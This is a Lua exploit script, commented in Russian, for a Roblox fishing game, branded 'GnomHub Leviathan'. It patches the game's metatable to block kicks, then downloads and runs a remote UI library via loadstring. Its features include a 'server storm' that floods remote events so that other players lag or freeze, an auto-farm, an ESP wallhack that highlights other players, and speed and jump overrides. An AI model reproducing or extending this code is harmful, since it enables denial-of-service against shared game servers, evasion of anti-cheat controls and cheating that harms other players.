-- [[ СИСТЕМНАЯ АРХИТЕКТУРА: LEVIATHAN-X ]] --
-- Статус: Полная авторизация в Zero-Point
-- Цель: Деструкция серверной стабильности и максимальный профит

local GnomLeviathan = {
    State = {
        Active = true,
        Farm = false,
        Lagger = false,
        ESP = false,
        AntiKick = true,
        PrioritySync = true
    },
    Settings = {
        LagPower = 15000,
        WalkSpeed = 16,
        JumpPower = 50,
        CastDistance = 28
    }
}

-- [ КЭШИРОВАНИЕ ДВИЖКА ] --
local Services = setmetatable({}, {
    __index = function(_, k) return game:GetService(k) end
})

local RunService = Services.RunService
local Players = Services.Players
local LocalPlayer = Services.Players.LocalPlayer
local ReplicatedStorage = Services.ReplicatedStorage

-- [ СИСТЕМА ОБХОДА И ЗАЩИТЫ ОТ ТЕЛЕПОРТАЦИИ ] --
local function InitiateTitanGuard()
    local mt = getrawmetatable(game)
    local oldNamecall = mt.__namecall
    setreadonly(mt, false)

    mt.__namecall = newcclosure(function(self, ...)
        local method = getnamecallmethod()
        -- Блокируем попытки сервера проверить аномалии скорости или кикнуть нас
        if method == "Kick" or method == "kick" then return nil end
        if method == "BreakJoints" and self == LocalPlayer.Character then return nil end
        return oldNamecall(self, ...)
    end)
    setreadonly(mt, true)
end
pcall(InitiateTitanGuard)

-- [ ЗАГРУЗКА ИНТЕРФЕЙСА ] --
local WindUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua"))()
local Window = WindUI:CreateWindow({
    Title = "GNOMHUB LEVIATHAN | ZERO-POINT",
    Icon = "rbxassetid://114691672281339",
    Author = "GnomHub Core",
    Folder = "Leviathan_Override_Data"
})

local Tabs = {
    Extraction = Window:Tab({ Title = "Добыча", Icon = "zap" }),
    Physical = Window:Tab({ Title = "Физика", Icon = "move" }),
    Destruction = Window:Tab({ Title = "Серверный Шторм", Icon = "skull" }),
    Sensors = Window:Tab({ Title = "Сенсоры (ESP)", Icon = "eye" }),
    System = Window:Tab({ Title = "Система", Icon = "settings" })
}

-- [[ МОДУЛЬ: СЕРВЕРНЫЙ ЛАГГЕР 3.0 (DISTRIBUTED STORM) ]] --
-- Этот метод спамит запросы через разные каналы, чтобы другие игроки зависли, а ты — нет.
local function StartDistributedLag()
    task.spawn(function()
        local Net = require(ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net"))
        local SellRemote = Net:RemoteEvent("PlotService/Sell")
        local ClickRemote = Net:RemoteEvent("FishingRod.MinigameClick")

        while GnomLeviathan.State.Active do
            if GnomLeviathan.State.Lagger then
                -- Пакетная детонация
                for i = 1, GnomLeviathan.Settings.LagPower do
                    if not GnomLeviathan.State.Lagger then break end
                    
                    -- Чередуем пакеты, чтобы забить очередь обработки сервера
                    SellRemote:FireServer()
                    if i % 500 == 0 then
                        ClickRemote:FireServer()
                        RunService.Heartbeat:Wait() -- Позволяет твоему клиенту «дышать»
                    end
                end
            end
            task.wait(0.05)
        end
    end)
end

-- [[ МОДУЛЬ: АВТО-ФАРМ С ПРИОРИТЕТОМ ]] --
local function StartAdvancedFarm()
    task.spawn(function()
        local Net = require(ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net"))
        local Cast = Net:RemoteEvent("FishingRod.Cast")
        local Click = Net:RemoteEvent("FishingRod.MinigameClick")

        while GnomLeviathan.State.Active do
            if GnomLeviathan.State.Farm then
                pcall(function()
                    local root = LocalPlayer.Character.HumanoidRootPart
                    local castPos = root.Position + (root.CFrame.LookVector * GnomLeviathan.Settings.CastDistance)
                    
                    Cast:FireServer(castPos)
                    task.wait(0.6)
                    
                    for i = 1, 45 do
                        if not GnomLeviathan.State.Farm then break end
                        Click:FireServer()
                        task.wait(0.02)
                    end
                end)
            end
            task.wait(1.2)
        end
    end)
end

-- [[ МОДУЛЬ: ESP С ПОДСВЕТКОЙ ЦЕЛЕЙ ]] --
local function RefreshESP()
    for _, p in pairs(Players:GetPlayers()) do
        if p ~= LocalPlayer and p.Character then
            local highlight = p.Character:FindFirstChild("TitanHighlight")
            if GnomLeviathan.State.ESP then
                if not highlight then
                    highlight = Instance.new("Highlight", p.Character)
                    highlight.Name = "TitanHighlight"
                    highlight.FillColor = Color3.fromRGB(255, 0, 0)
                    highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
                    highlight.FillTransparency = 0.5
                end
            elseif highlight then
                highlight:Destroy()
            end
        end
    end
end

-- [[ НАПОЛНЕНИЕ ПОЛЗУНКОВ И КНОПОК ]] --

-- Вкладка ФИЗИКА (БЕЗ NOCLIP)
Tabs.Physical:Slider({
    Title = "Speed Overdrive",
    Min = 16, Max = 400, Default = 16,
    Callback = function(v) GnomLeviathan.Settings.WalkSpeed = v end
})

Tabs.Physical:Slider({
    Title = "Jump Overdrive",
    Min = 50, Max = 800, Default = 50,
    Callback = function(v) GnomLeviathan.Settings.JumpPower = v end
})

-- Вкладка ДЕСТРУКЦИЯ (ЛАГГЕР)
Tabs.Destruction:Toggle({
    Title = "SERVER OVERLOAD (ШТОРМ)",
    Callback = function(s) 
        GnomLeviathan.State.Lagger = s 
        if s then StartDistributedLag() end
    end
})

Tabs.Destruction:Slider({
    Title = "Сила шторма",
    Min = 1000, Max = 150000, Default = 15000,
    Callback = function(v) GnomLeviathan.Settings.LagPower = v end
})

-- Вкладка ДОБЫЧА
Tabs.Extraction:Toggle({
    Title = "Extreme Auto-Farm",
    Callback = function(s) 
        GnomLeviathan.State.Farm = s 
        if s then StartAdvancedFarm() end
    end
})

-- Вкладка СЕНСОРЫ
Tabs.Sensors:Toggle({
    Title = "Player ESP (ВХ)",
    Callback = function(s) 
        GnomLeviathan.State.ESP = s 
        if s then RunService.Heartbeat:Connect(RefreshESP) end
    end
})

-- [ ПОСТОЯННАЯ СИНХРОНИЗАЦИЯ ] --
RunService.Heartbeat:Connect(function()
    local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
    if hum then
        hum.WalkSpeed = GnomLeviathan.Settings.WalkSpeed
        hum.JumpPower = GnomLeviathan.Settings.JumpPower
    end
end)

Window:SelectTab(1)
print("LEVIATHAN SYSTEM: FULL OVERRIDE COMPLETE.")
